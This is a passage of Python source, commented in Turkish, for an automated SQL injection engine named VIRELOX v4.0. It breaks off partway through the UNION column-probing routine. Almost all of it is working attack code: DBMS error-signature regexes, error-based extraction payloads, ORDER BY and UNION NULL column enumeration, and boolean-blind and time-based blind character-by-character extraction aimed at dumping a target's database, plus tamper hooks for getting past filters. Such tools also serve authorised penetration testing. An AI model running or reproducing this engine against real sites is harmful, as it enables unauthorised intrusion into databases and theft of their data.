"""
VIRELOX SQL Injection Motoru v4.0
Hata/UNION(90 kolon)/Boolean-Blind/Time-Based/Stacked + Tam DB Dump
Canlı payload log · 5x açık doğrulama · POST injection · Session
Mozilla Public License 2.0 — AltayHR Developers
"""
import re, time, random, string, urllib.parse, threading, concurrent.futures
from typing import Optional, Dict, List, Any, Callable
from datetime import datetime

# Merkezi veri normalleştirici — binary/garbled DB yanıtlarını temizler
try:
    from zeka_sistemi.veri_temizleyici import VeriTemizleyici as _VT
    _temizleyici = _VT()
except ImportError:
    _temizleyici = None  # Güvenli fallback — eski davranış korunur

# ── Sniper Yanıt Doğrulayıcı ─────────────────────────────────────────────────
# HTML/JS gürültüsünü gerçek DB verisinden ayırt eder; OOB/hash için tutarlılık
# denetçisi. Import başarısızlığında None → eski davranış korunur.
try:
    from modüller.yanit_dogrulayici import ResponseValidator, ConsistencyChecker
    _rv_global: Optional[object] = ResponseValidator()
    _cc_global: Optional[object] = ConsistencyChecker()
except ImportError:
    _rv_global = None
    _cc_global = None


class HataDeseniTespiti:
    """SQLmap errors.xml'den alınan tam DBMS hata desenleri"""
    HATA_DESENLERI = {
        "MySQL": [
            r"SQL syntax.*?MySQL", r"Warning.*?\Wmysqli?_",
            r"MySQLSyntaxErrorException", r"valid MySQL result",
            r"check the manual that (corresponds to|fits) your MySQL server version",
            r"check the manual that (corresponds to|fits) your MariaDB server version",
            r"Unknown column '[^ ]+' in 'field list'",
            r"MySqlClient\.", r"com\.mysql\.jdbc",
            r"Zend_Db_(Adapter|Statement)_Mysqli_Exception",
            r"Pdo[./_\\]Mysql", r"MySqlException", r"pymysql\.err\.",
            r"MySQLdb\.(_exceptions\.|\w+Error)",
            r"MemSQL does not support this type of query",
            r"SQLSTATE\[HY000\].*?MySQL",
        ],
        "MariaDB": [
            r"MariaDB server version",
            r"SQLSTATE\[HY000\].*?MariaDB",
        ],
        "PostgreSQL": [
            r"PostgreSQL.*?ERROR", r"Warning.*?\Wpg_",
            r"valid PostgreSQL result", r"Npgsql\.",
            r"PG::SyntaxError:", r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR: parser: parse error at or near",
            r"PostgreSQL query failed",
            r"pg_query\(\).*:.*ERROR",
            r"psycopg2?\.(errors\.|\w+Error)",
            r"asyncpg\.(exceptions\.|\w+Error)",
        ],
        "Microsoft SQL Server": [
            r"Driver.*? SQL[\-_ ]*Server",
            r"OLE DB.*? SQL Server", r"\bSQL Server\b.*Driver",
            r"Warning.*?\W(mssql|sqlsrv)_", r"Msg \d+, Level \d+",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Incorrect syntax near", r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver", r"macromedia\.jdbc\.sqlserver",
            r"com\.jnetdirect\.jsql", r"\[Microsoft\]\[ODBC SQL Server Driver\]",
            r"System\.Data\.SqlClient\.(SqlException|SqlConnection\.OnError)",
            r"com\.microsoft\.sqlserver\.jdbc",
        ],
        "Oracle": [
            r"\bORA-\d{4,5}", r"Oracle error",
            r"Oracle.*?Driver", r"Warning.*?\Woci_",
            r"Warning.*?\Wora_", r"oracle\.jdbc\.driver",
            r"quoted string not properly terminated",
            r"SQL command not properly ended",
            r"cx_Oracle\.\w+Error", r"oracledb\.(exceptions\.|\w+Error)",
        ],
        "SQLite": [
            r"SQLite/JDBCDriver", r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*?\Wsqlite_", r"\[SQLITE_ERROR\]",
            r"sqlite3\.OperationalError", r"SQLite error",
            r"unrecognized token", r"near \".*?\": syntax error",
            r"SqliteError:",
        ],
        "IBM DB2": [
            r"CLI Driver.*?DB2", r"DB2 SQL error",
            r"\bdb2_\w+\(", r"SQLCODE[=:\d, -]+SQLSTATE",
            r"com\.ibm\.db2\.jcc", r"ibm_db_dbi\.ProgrammingError",
        ],
        "Sybase": [
            r"(?i)Warning.*?\Wsybase_", r"Sybase message",
            r"Adaptive Server.*?encountered.*?error",
            r"SybSQLException", r"Sybase\.Data\.AseClient",
        ],
        "Informix": [
            r"Warning.*?\Wifx_", r"Exception.*?Informix",
            r"Informix ODBC Driver", r"com\.informix\.jdbc",
        ],
        "Firebird": [
            r"Dynamic SQL Error.{1,10}SQL error code",
            r"Warning.*?\Wibase_", r"org\.firebirdsql\.jdbc",
        ],
        "SAP MaxDB": [
            r"POS([0-9]+) Unknown token", r"Warning.*?\Wmaxdb_",
        ],
        "CockroachDB": [
            r"CockroachDB.*?error", r"SQLSTATE.*?CockroachDB",
        ],
        "ClickHouse": [
            r"ClickHouse.*?exception", r"DB::Exception",
        ],
    }

    @staticmethod
    def tespit_et(icerik: str):
        for dbms, desenler in HataDeseniTespiti.HATA_DESENLERI.items():
            for desen in desenler:
                if re.search(desen, icerik, re.IGNORECASE | re.DOTALL):
                    return True, dbms
        return False, None


class SQLInjectionMotoru:
    """
    VIRELOX SQL Injection Motoru v4.0
    - UNION 90 kolon
    - Canlı per-payload log (her payload anında gösterilir)
    - 5x açık doğrulama (farklı yöntemler)
    - Boolean/Time/Stacked/Error/UNION
    - Brute force tablo bulucu entegre
    """

    def __init__(self, http_istemci, log_func: Callable = None,
                 payload_log_func: Callable = None):
        self.http             = http_istemci
        self.log              = log_func or (lambda m: None)
        self.payload_log      = payload_log_func or log_func or (lambda m: None)
        self.tespit_dbms: Optional[str] = None
        self.kolon_sayisi: Optional[int] = None
        self.metin_kolonu: Optional[int] = None
        self._union_prefix    = "-1"
        self._union_yorum     = "-- -"
        self._bypass_tamper   = None
        # BUG FIX: without this flag, every caller of union_sorgu_calistir()
        # that runs before UNION column-count is known (tablolari_al,
        # kolonlari_al, tablo_verisi_cek, _brute_force_tablolar — i.e. the
        # whole table-detection/dump phase) would re-trigger a full ORDER BY
        # 1..90 x 8-prefix rescan on *every single call* whenever UNION isn't
        # actually exploitable. With brute-force table detection alone calling
        # this hundreds of times, that looked like an endless "ORDER BY" loop.
        # Cache the first failure and stop retrying for the rest of this scan.
        self._union_basarisiz = False

        # ── Sniper modu: ResponseValidator + ConsistencyChecker ──────────────
        # _rv  : HTML/JS gürültü filtresi ve veri bloğu doğrulayıcı
        # _cc  : OOB/Hash payload'ları için 3-sorgu tutarlılık denetçisi
        # _dump_kilit: paralel tablo dump için thread-safe state erişimi
        self._rv = _rv_global
        self._cc = _cc_global
        self._dump_kilit = threading.Lock()

        # ── Genel amaçlı boolean-blind koşul doğrulayıcı (kosul_dogrula) ────
        # SQLmap mantığıyla karakter-karakter brute force gibi ihtiyaçlar için
        # kullanılır: keşfedilen çalışan TRUE/FALSE kalıbı önbelleğe alınır,
        # böylece her koşul kontrolü tek bir istekle yapılabilir.
        self._referans_uzunluk: Optional[int] = None
        self._kosul_kalibi = None

        # ── Başarılı UNION concat stili önbelleği ─────────────────────────────
        # Bir kez çalışan prefix/yorum/concat kombinasyonu kaydedilir; sonraki
        # tüm union_sorgu_calistir çağrıları doğrudan bu kombinasyonu kullanır.
        # Böylece her sorgu için 60+ kombinasyon yeniden denenmez.
        self._union_concat_cache: Optional[Dict[str, str]] = None  # {prefix, yorum, concat_tpl}

        # ── Tarama derinliği (1=hızlı, 2=normal, 3=kapsamlı) ────────────────
        # virelox.py tarafından ayarlanır: motor._level = args.level
        self._level: int = 1

        # ── Açık doğrulama bayrağı ───────────────────────────────────────────
        # True olursa injection açığının kesin doğrulandığı anlamına gelir.
        # tablolari_al() bu bayrağı kontrol ederek brute force'u sadece
        # gerçekten açık hedeflerde çalıştırır (kör tarama önlenir).
        self._acik_dogrulandi: bool = False

    # TRUE/FALSE karşılaştırma kalıpları — {c} yerine keyfi bir SQL boolean
    # koşulu (örn. "ASCII(SUBSTRING(...))>77") yerleştirilir.
    _KOSUL_KALIPLARI = [
        ("1 AND ({c})-- -",  "1 AND NOT ({c})-- -"),
        ("' AND ({c})-- -",  "' AND NOT ({c})-- -"),
        ("1) AND ({c})-- -", "1) AND NOT ({c})-- -"),
        ("1' AND ({c})-- -", "1' AND NOT ({c})-- -"),
        ("1 AND ({c})#",     "1 AND NOT ({c})#"),
    ]

    def test(self, url: str, param: str, post_data=None) -> dict:
        """
        Evrensel test dispatcher — InjectionMotor.tam_tara() ile uyum sağlar.

        BUG FIX: InjectionMotor._motor_yukle() error/union/boolean/time/stacked
        için bu sınıfı döndürüyor, ardından motor.test() çağırıyor.
        Bu metod olmadığında --scan-all AttributeError veriyordu.

        Hata tabanlı → UNION → Boolean → Time sırasıyla dener; ilk başarılıyı
        döner. Tümü başarısızsa basarili=False döner.
        """
        sira = [
            ("hata_tabanli_test",  "error"),
            ("union_tabanli_test", "union"),
            ("boolean_blind_test", "boolean"),
            ("time_based_test",    "time"),
        ]
        for metod_adi, tip_adi in sira:
            try:
                metod = getattr(self, metod_adi)
                sonuc = metod(url, param, post_data=post_data)
                if isinstance(sonuc, dict) and sonuc.get("basarili"):
                    sonuc.setdefault("tip", tip_adi)
                    return sonuc
            except Exception:
                continue
        return {"basarili": False, "tip": "sql", "sebep": "tüm teknikler başarısız"}

    def _dogrulayici(self):
        """
        Lazy-load ResponseValidator (Sniper yanıt doğrulayıcı).
        Import başarısızlığında None döner — eski davranış korunur.
        """
        if self._rv is None:
            try:
                from modüller.yanit_dogrulayici import ResponseValidator
                self._rv = ResponseValidator(log_func=self.log)
            except ImportError:
                pass
        return self._rv

    def _dogrulayici_cc(self):
        """Lazy-load ConsistencyChecker — OOB/hash payload doğrulaması için."""
        if self._cc is None:
            try:
                from modüller.yanit_dogrulayici import ConsistencyChecker
                self._cc = ConsistencyChecker(log_func=self.log)
            except ImportError:
                pass
        return self._cc

    # ── BOOLEAN BLIND VERİ ÇEKME (SQLMap binary search mantığı) ──────────────
    def boolean_veri_cek(self, url: str, param: str, sorgu: str,
                          post_data=None, max_uzunluk: int = 512) -> Optional[str]:
        """
        Boolean blind ile herhangi bir SQL sorgusunun sonucunu çeker.
        SQLMap'in binary-search (bisection) mantığı: her karakter için log2(94)~7
        istek, 50 karakterlik veri ~350 istek ile çekilir.

        Kullanım:
            db_adi = self.boolean_veri_cek(url, param, "SELECT database()")
            tablolar = self.boolean_veri_cek(url, param,
                "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
                "WHERE table_schema=database()")
        """
        # Önce uzunluk bul (0–max_uzunluk arası binary search)
        uzunluk = self._boolean_sayi_al(url, param,
                                         f"LENGTH(({sorgu}))",
                                         post_data, 0, max_uzunluk)
        if uzunluk is None or uzunluk == 0:
            self.log("[BOOL-BLIND] Uzunluk alınamadı veya sıfır — veri çekilemiyor")
            return None

        self.log(f"[BOOL-BLIND] Veri uzunluğu: {uzunluk} karakter")
        sonuc = []
        for pos in range(1, uzunluk + 1):
            if pos % 10 == 0 or pos == uzunluk:
                self.log(f"[BOOL-BLIND] {pos}/{uzunluk} karakter çekildi...")
            karakter = self._boolean_karakter_al(url, param, sorgu, pos, post_data)
            if karakter is None:
                self.log(f"[BOOL-BLIND] Pos {pos}: karakter alınamadı — durduruluyor")
                break
            sonuc.append(karakter)

        veri = "".join(sonuc)
        if veri:
            self.log(f"[BOOL-BLIND] ✔ Veri çekildi: {veri[:80]}")
        return veri if veri else None

    def _boolean_sayi_al(self, url: str, param: str, sayi_sorgusu: str,
                          post_data, lo: int = 0, hi: int = 512) -> Optional[int]:
        """
        Binary search ile sayısal değer çeker.
        sayi_sorgusu: SQL ifadesi, sayısal değer döner (örn. "LENGTH(database())")
        """
        # Önce sınırı doğrula: hi değeri gerçekten yeterli mi?
        for deneme_hi in [hi, hi * 2, hi * 4]:
            kosul = f"({sayi_sorgusu})<={deneme_hi}"
            sonuc = self.kosul_dogrula(url, param, kosul, post_data)
            if sonuc is None:
                return None  # boolean blind çalışmıyor
            if sonuc:
                hi = deneme_hi
                break
        else:
            return None  # çok büyük değer, iptal

        # Binary search
        while lo < hi:
            mid = (lo + hi + 1) // 2
            kosul = f"({sayi_sorgusu})>={mid}"
            sonuc = self.kosul_dogrula(url, param, kosul, post_data)
            if sonuc is None:
                return None
            if sonuc:
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _boolean_karakter_al(self, url: str, param: str, sorgu: str,
                              pos: int, post_data) -> Optional[str]:
        """
        Binary search ile belirli bir pozisyondaki ASCII karakteri çeker.
        Printable ASCII aralığı (32–126) üzerinde binary search yapar.
        """
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi + 1) // 2
            kosul = f"ASCII(SUBSTRING(({sorgu}),{pos},1))>={mid}"
            sonuc = self.kosul_dogrula(url, param, kosul, post_data)
            if sonuc is None:
                return None
            if sonuc:
                lo = mid
            else:
                hi = mid - 1
        # Geçerli ASCII değil veya NULL karakter
        if lo < 32 or lo > 126:
            return None
        return chr(lo)

    # ── TIME-BASED BLIND VERİ ÇEKME ──────────────────────────────────────────
    def time_veri_cek(self, url: str, param: str, sorgu: str,
                       post_data=None, gecikme: int = 3,
                       max_uzunluk: int = 256) -> Optional[str]:
        """
        Time-based blind ile SQL sorgusunun sonucunu çeker.
        SLEEP() ile binary search — her karakter ~14 istek × gecikme saniye.
        NOT: Yavaş yöntem; önce boolean_veri_cek deneyin.
        """
        temel = self._temel_gecikme_olc(url, param, post_data)
        esik  = max(gecikme * 0.75, temel + gecikme * 0.5)

        def _kosul_gecikme(kosul: str) -> Optional[bool]:
            """SLEEP() ile bool doğrulama — gecikme varsa True."""
            dbms = self.tespit_dbms or "MySQL"
            if dbms in ("Microsoft SQL Server", "Sybase"):
                payload_tpl = f"1; IF ({kosul}) WAITFOR DELAY '0:0:{gecikme}'-- -"
            elif dbms == "PostgreSQL":
                payload_tpl = f"1; SELECT CASE WHEN ({kosul}) THEN pg_sleep({gecikme}) ELSE pg_sleep(0) END-- -"
            elif dbms == "Oracle":
                payload_tpl = f"1 AND CASE WHEN ({kosul}) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{gecikme}) ELSE 1 END=1-- -"
            else:  # MySQL/MariaDB/SQLite
                payload_tpl = f"1 AND IF(({kosul}),SLEEP({gecikme}),0)-- -"

            try:
                bas = time.time()
                self._istek_at(url, param, payload_tpl, post_data=post_data,
                               timeout=gecikme + 15)
                sure = time.time() - bas
                return sure >= esik
            except Exception:
                return None

        # Uzunluk bul
        lo, hi = 0, max_uzunluk
        while lo < hi:
            mid = (lo + hi + 1) // 2
            sonuc = _kosul_gecikme(f"LENGTH(({sorgu}))>={mid}")
            if sonuc is None:
                return None
            if sonuc:
                lo = mid
            else:
                hi = mid - 1
        uzunluk = lo
        if uzunluk == 0:
            return None
        self.log(f"[TIME-BLIND] Veri uzunluğu: {uzunluk} karakter")

        # Karakterleri çek
        sonuc_chars = []
        for pos in range(1, uzunluk + 1):
            c_lo, c_hi = 32, 126
            while c_lo < c_hi:
                mid = (c_lo + c_hi + 1) // 2
                ck = _kosul_gecikme(f"ASCII(SUBSTRING(({sorgu}),{pos},1))>={mid}")
                if ck is None:
                    c_lo = 63  # '?' varsayımı
                    break
                if ck:
                    c_lo = mid
                else:
                    c_hi = mid - 1
            if c_lo < 32 or c_lo > 126:
                break
            sonuc_chars.append(chr(c_lo))
            if pos % 5 == 0:
                self.log(f"[TIME-BLIND] {pos}/{uzunluk}: {''.join(sonuc_chars)}")

        veri = "".join(sonuc_chars)
        return veri if veri else None

    def _referans_uzunluk_al(self, url, param, post_data=None):
        if self._referans_uzunluk is None:
            try:
                r = self._istek_at(url, param, "1", post_data=post_data)
                self._referans_uzunluk = len(getattr(r, 'text', '')) if r else None
            except Exception:
                self._referans_uzunluk = None
        return self._referans_uzunluk

    def kosul_dogrula(self, url, param, kosul: str, post_data=None) -> Optional[bool]:
        """
        Genel amaçlı boolean-blind koşul doğrulayıcı.
        Verilen SQL boolean koşulunun (örn. "ASCII(SUBSTRING(...))>77")
        hedefte doğru mu yanlış mı olduğunu, TRUE/FALSE yanıt farkına
        bakarak belirler. İlk çağrıda hangi enjeksiyon kalıbının (tırnak/
        yorum stili) işe yaradığı keşfedilip önbelleğe alınır; sonraki her
        çağrı tek bir istekle koşulu test eder. Oracle kurulamazsa None
        döner (bağlantı yok ya da hedef blind'a uygun değil).
        """
        ref = self._referans_uzunluk_al(url, param, post_data)
        if ref is None:
            return None
        tolerans = max(5, int(ref * 0.02))

        if self._kosul_kalibi:
            dogru_tpl, _ = self._kosul_kalibi
            try:
                y = self._istek_at(url, param, dogru_tpl.format(c=kosul), post_data=post_data)
                if not y:
                    return None
                return abs(len(getattr(y, 'text', '')) - ref) <= tolerans
            except Exception:
                return None

        for dogru_tpl, yanlis_tpl in self._KOSUL_KALIPLARI:
            try:
                d = self._istek_at(url, param, dogru_tpl.format(c=kosul), post_data=post_data)
                y = self._istek_at(url, param, yanlis_tpl.format(c=kosul), post_data=post_data)
                if not d or not y:
                    continue
                d_fark = abs(len(getattr(d, 'text', '')) - ref)
                y_fark = abs(len(getattr(y, 'text', '')) - ref)
                if d_fark <= tolerans and y_fark > tolerans:
                    self._kosul_kalibi = (dogru_tpl, yanlis_tpl)
                    return True
                if y_fark <= tolerans and d_fark > tolerans:
                    # NOT(kosul) tarafı referansa benziyor → koşul aslında yanlış.
                    # ÖNEMLİ: dogru_tpl her zaman koşulu OLDUĞU GİBİ (negatifsiz)
                    # enjekte eder, bu yüzden her durumda dogru_tpl'yi önbelleğe
                    # alıyoruz — "yanıt referansa benziyorsa koşul TRUE'dur"
                    # anlamı her zaman dogru_tpl için geçerli kalır. yanlis_tpl'yi
                    # önbelleğe almak (önceki hata) polariteyi tersine çevirip
                    # sonraki tüm koşul sorgularını yanlış yorumlatıyordu.
                    self._kosul_kalibi = (dogru_tpl, yanlis_tpl)
                    return False
            except Exception:
                continue
        return None

    def tamper_ayarla(self, zincir: List[str]):
        if not zincir:
            self._bypass_tamper = None
            return
        from zeka_sistemi.pyload_havuzu.tamper_teknikleri import tamper_zinciri_uygula
        self._bypass_tamper = lambda p: tamper_zinciri_uygula(p, zincir)

    def _t(self, payload):
        return self._bypass_tamper(payload) if self._bypass_tamper else payload

    def _istek_at(self, url, param, payload, post_data=None, timeout=None):
        """GET veya POST isteği gönder — POST data varsa POST kullanır"""
        t_payload = self._t(payload)
        if post_data is not None:
            pd = self._post_hazirla(post_data, param, t_payload)
            return self.http.post(url, data=pd, timeout=timeout)
        return self.http.get(self._url_hazirla(url, param, t_payload), timeout=timeout)

    def _url_hazirla(self, url, param, payload):
        p = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(p.query))
        params[param] = payload
        return urllib.parse.urlunparse((
            p.scheme, p.netloc, p.path, '', urllib.parse.urlencode(params), ''))

    def _post_hazirla(self, post_data, param, payload):
        if isinstance(post_data, dict):
            d = post_data.copy()
            d[param] = payload
            return d
        try:
            params = dict(urllib.parse.parse_qsl(post_data))
            params[param] = payload
            return urllib.parse.urlencode(params)
        except Exception:
            return post_data

    def _get(self, url, timeout=None):
        return self.http.get(url, timeout=timeout)

    def _concat(self, once, sorgu, sonra):
        d = self.tespit_dbms or "MySQL"
        if d in ("SQLite", "PostgreSQL", "Oracle", "Firebird"):
            return f"'{once}'||({sorgu})||'{sonra}'"
        elif d == "Microsoft SQL Server":
            return f"'{once}'+({sorgu})+'{sonra}'"
        elif d in ("IBM DB2", "SAP MaxDB"):
            return f"'{once}'||({sorgu})||'{sonra}'"
        return f"CONCAT('{once}',({sorgu}),'{sonra}')"

    # ── PAYLOAD LOG YARDIMCISI ────────────────────────────────────────────────
    def kolon_bilgisi_yukle(self, kolon_sayisi: int, metin_kolonu: int,
                            prefix: str = "-1", yorum: str = "-- -"):
        """Dışarıdan kolon bilgisini enjekte eder — dump fazında yeniden taramayı önler."""
        self.kolon_sayisi   = kolon_sayisi
        self.metin_kolonu   = metin_kolonu
        self._union_prefix  = prefix
        self._union_yorum   = yorum
        self._union_basarisiz = False

    def _log_payload_gonder(self, payload, no: int = None, toplam: int = None):
        """Her payload gönderildiğinde canlı log — her 15 denemede bir veya ilk/son."""
        if no and toplam:
            # Throttle: sadece 1., son ve her 15.'de bir log bas
            if no != 1 and no != toplam and (no % 15) != 0:
                return
        kisa = payload[:58] + "…" if len(payload) > 58 else payload
        if no and toplam:
            self.payload_log(f"[{no:>3}/{toplam}] → {kisa}")
        else:
            self.payload_log(f"→ PYLD: {kisa}")

    def _log_payload_sonuc(self, payload, basarili: bool, detay: str = ""):
        kisa = payload[:55] + "…" if len(payload) > 55 else payload
        if basarili:
            self.payload_log(f"✔ ONAY: {kisa}{(' → ' + detay) if detay else ''}")
        else:
            self.payload_log(f"  MISS: {kisa}")

    # ── 1. HATA TABANLI ──────────────────────────────────────────────────────
    def hata_tabanli_test(self, url, param, post_data=None):
        sonuc = {"basarili": False, "dbms": None, "payload": None}

        temel = ["'", '"', "`", "\\", "';", '";', "') ", "1'", "1\"", "1`"]

        try:
            from zeka_sistemi.pyload_havuzu.sqlmap_payloads import (
                HATA_PAYLOADLARI, GENEL_HATA_TETIKLEYICILER)
            payloadlar = temel + GENEL_HATA_TETIKLEYICILER[:]
            for dbms_p in HATA_PAYLOADLARI.values():
                payloadlar.extend([f"1 {p}" for p in dbms_p[:6]])
                payloadlar.extend([f"' {p}" for p in dbms_p[:4]])
        except ImportError:
            payloadlar = temel + [
                "1 AND extractvalue(1,concat(0x7e,version()))-- -",
                "1 AND updatexml(1,concat(0x7e,version()),1)-- -",
                "' AND extractvalue(1,concat(0x7e,database()))-- -",
                "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
                "' AND 1=cast(version() as int)--",
                "' AND 1=convert(int,@@version)--",
            ]

        toplam = len(payloadlar)
        for i, p in enumerate(payloadlar, 1):
            self._log_payload_gonder(p, i, toplam)
            try:
                yanit = self._istek_at(url, param, p, post_data=post_data)
                if not yanit:
                    self._log_payload_sonuc(p, False, "yanıt yok")
                    continue
                icerik = getattr(yanit, 'text', '')
                tespit, dbms = HataDeseniTespiti.tespit_et(icerik)
                if tespit:
                    self._log_payload_sonuc(p, True, f"DBMS={dbms}")
                    sonuc.update({"basarili": True, "dbms": dbms, "payload": p})
                    self.tespit_dbms = dbms
                    self._acik_dogrulandi = True
                    return sonuc
                else:
                    self._log_payload_sonuc(p, False)
            except Exception as e:
                self._log_payload_sonuc(p, False, str(e)[:30])
                continue
        return sonuc

    def hata_sorgu_calistir(self, url, param, sorgu, post_data=None):
        payloadlar = [
            f"1 AND extractvalue(1,concat(0x7e,({sorgu}),0x7e))-- -",
            f"1 AND updatexml(1,concat(0x7e,({sorgu}),0x7e),1)-- -",
            f"' AND extractvalue(1,concat(0x7e,({sorgu}),0x7e))-- -",
            f"1' AND extractvalue(1,concat(0x7e,({sorgu}),0x7e))-- -",
            f"1 AND GTID_SUBSET(CONCAT(0x7e,({sorgu}),0x7e),1)-- -",
            f"1 AND CAST(({sorgu}) AS INT)-- -",
            f"' AND CAST(({sorgu}) AS INT)-- -",
            f"1 AND CONVERT(INT,({sorgu}))-- -",
            f"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({sorgu}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            f"' OR 1=CAST(({sorgu}) AS INT)--",
        ]
        for p in payloadlar:
            self._log_payload_gonder(p)
            try:
                yanit = self._istek_at(url, param, p, post_data=post_data)
                if not yanit:
                    continue
                icerik = getattr(yanit, 'text', '')
                # Sniper: ~ işareti yoksa ve yanıt büyük ölçüde HTML ise bu
                # yanıtı hızla atla — saf HTML sayfalar DB hatası taşımaz.
                rv = self._dogrulayici()
                if rv and '~' not in icerik and rv.html_gurultu_orani(icerik) > 0.55:
                    self._log_payload_sonuc(p, False, "Sniper: saf HTML, imza yok")
                    continue
                m = re.search(r'~([^~<]{1,500})~', icerik, re.DOTALL)
                if m:
                    val = m.group(1).strip()
                    if val and val not in ('1', '0'):
                        self._log_payload_sonuc(p, True, val[:40])
                        return val
                pm = re.search(r'invalid input syntax for (type )?integer: "([^"]+)"', icerik, re.DOTALL)
                if pm:
                    return pm.group(2)
                cm = re.search(r'Conversion failed when converting.*?value \'([^\']+)\'', icerik, re.DOTALL)
                if cm:
                    return cm.group(1)
            except Exception:
                continue
        return None

    # ── 2. UNION TABANLI — 90 Kolon ──────────────────────────────────────────
    def union_tabanli_test(self, url, param, max_kolon=90, post_data=None):
        """
        UNION-based SQLi testi — ORDER BY + UNION SELECT kombinasyonu
        max_kolon: 90'a kadar sütun tarama (varsayılan)
        """
        # ── ERKEN DÖNÜŞ: kolon bilgisi zaten önbellekteyse yeniden tarama yapma ──
        if self.kolon_sayisi is not None and self.metin_kolonu is not None:
            self.log("[UNION] Kolon bilgisi önbellekte — yeniden tarama atlanıyor")
            return {
                "basarili":     True,
                "kolon_sayisi": self.kolon_sayisi,
                "metin_kolonu": self.metin_kolonu,
                "prefix":       self._union_prefix,
                "yorum":        self._union_yorum,
            }
        if self._union_basarisiz:
            return {"basarili": False, "kolon_sayisi": None, "metin_kolonu": None}

        sonuc = {"basarili": False, "kolon_sayisi": None, "metin_kolonu": None}

        ref = self._istek_at(url, param, "9999999", post_data=post_data)
        ref_txt = getattr(ref, 'text', '') if ref else ''
        ref_len = len(ref_txt)

        # ── ADIM 1: ORDER BY ile kolon sayısı ────────────────────────────────
        kolon_sayisi = None
        ORDER_HATALAR = [
            r"Unknown column", r"ORDER BY.*out of range",
            r"1st ORDER BY term out of range",
            r"no such column", r"ORDER BY items must",
            r"Invalid column", r"Column.*not found",
            r"ORA-01785", r"order by.*not supported",
            r"not in ORDER BY clause", r"ORDER BY position.*out of range",
            r"order clause.*not found", r"1 ORDER BY",
        ]

        # Hız optimizasyonu: level parametresine göre prefix ve kolon sınırı
        # Level 1 → 2 prefix, 25 kolon max  (~50 istek, hızlı)
        # Level 2 → 4 prefix, 50 kolon max  (~200 istek)
        # Level 3 → 8 prefix, max_kolon     (~720 istek, kapsamlı)
        level = getattr(self, '_level', 1)
        if level == 1:
            orderby_prefixler = ["1", "1'"]
            kolon_limit = min(max_kolon, 25)
        elif level == 2:
            orderby_prefixler = ["1", "1'", '1"', "1)"]
            kolon_limit = min(max_kolon, 50)
        else:
            orderby_prefixler = ["1", "1'", '1"', "1`", "1)", "1')", "1\\'", "1/*"]
            kolon_limit = max_kolon

        self.log(f"[UNION] ORDER BY ile kolon sayısı taranıyor (1–{kolon_limit}, {len(orderby_prefixler)} prefix)...")
        for prefix in orderby_prefixler:
            for n in range(1, kolon_limit + 1):
                payload = f"{prefix} ORDER BY {n}-- -"
                self._log_payload_gonder(payload, n, kolon_limit)
                try:
                    yanit = self._istek_at(url, param, payload, post_data=post_data)
                    if not yanit:
                        continue
                    icerik = getattr(yanit, 'text', '')
                    kod    = getattr(yanit, 'status_code', 200)
                    if (kod in (500,) or
                            any(re.search(pat, icerik, re.IGNORECASE) for pat in ORDER_HATALAR)):
                        if n > 1:
                            kolon_sayisi = n - 1
                            self.log(f"[UNION] ORDER BY {n} hata → kolon sayısı={kolon_sayisi}")
                            self._log_payload_sonuc(payload, True, f"kolon={kolon_sayisi}")
                            break
                        else:
                            # Bu prefix ORDER BY 1'de hata verdi — uyumsuz, sonrakine geç
                            break
                except Exception:
                    continue
            if kolon_sayisi:
                break

        # ORDER BY ile bulunamadıysa UNION NULL ile dene
        if not kolon_sayisi:
            self.log("[UNION] ORDER BY başarısız → UNION NULL deneniyor...")
            if level == 1:
                null_prefixler = ["-1", "-1'", "0"]
            elif level == 2:
                null_prefixler = ["-1", "-1'", '-1"', "-1`", "0"]
            else:
                null_prefixler = ["-1", "-1'", '-1"', "-1`", "0", "' AND 1=2"]
            for prefix in null_prefixler:
                for n in range(1, kolon_limit + 1):
                    kl = ["NULL"] * n
                    payload = f"{prefix} UNION SELECT {','.join(kl)}-- -"
                    self._log_payload_gonder(payload, n, kolon_limit)
                    try:
                        yanit = self._istek_at(url, param, payload, post_data=post_data)
                        if not yanit:
                            continue
                        icerik = getattr(yanit, 'text', '')
                        kod    = getattr(yanit, 'status_code', 200)
                        if kod == 200 and len(icerik) != ref_len:
                            if not any(re.search(pat, icerik, re.IGNORECASE)
                                       for pat in ["syntax error", "sql.*error"]):
                                kolon_sayisi = n
                                self.log(f"[UNION] NULL yöntemi kolon={n}")
                                self._log_payload_sonuc(payload, True, f"n={n}")
                                break
                    except Exception:
                        continue
                if kolon_sayisi:
                    break

        if not kolon_sayisi:
            return sonuc

        self.kolon_sayisi = kolon_sayisi

        # ── ADIM 2: Metin kolonu bul ─────────────────────────────────────────
        self.log(f"[UNION] {kolon_sayisi} kolon bulundu — metin kolonu aranıyor...")
        ISARETCI = "VLX_COL_PROBE"
        # Level 1 → en yaygın 2 prefix × 2 yorum = 4 kombinasyon
        # Level 2 → 3 prefix × 3 yorum
        # Level 3 → 5 prefix × 5 yorum (tam kapsam)
        level = getattr(self, '_level', 1)
        if level == 1:
            mt_prefixler = ["-1", "-1'"]
            mt_yorumlar  = ["-- -", "#"]
        elif level == 2:
            mt_prefixler = ["-1", "-1'", "0"]
            mt_yorumlar  = ["-- -", "#", "-- "]
        else:
            mt_prefixler = ["-1", "0", "' AND 1=2", "-1'", "1 AND 2=3"]
            mt_yorumlar  = ["-- -", "#", "-- ", "/**/-- -", "--+-"]
        for prefix in mt_prefixler:
            for yorum in mt_yorumlar:
                for i in range(kolon_sayisi):
                    kl = ['NULL'] * kolon_sayisi
                    kl[i] = f"'{ISARETCI}'"
                    payload = f"{prefix} UNION SELECT {','.join(kl)}{yorum}"
                    self._log_payload_gonder(payload, i+1, kolon_sayisi)
                    try:
                        yanit = self._istek_at(url, param, payload, post_data=post_data)
                        if not yanit:
                            continue
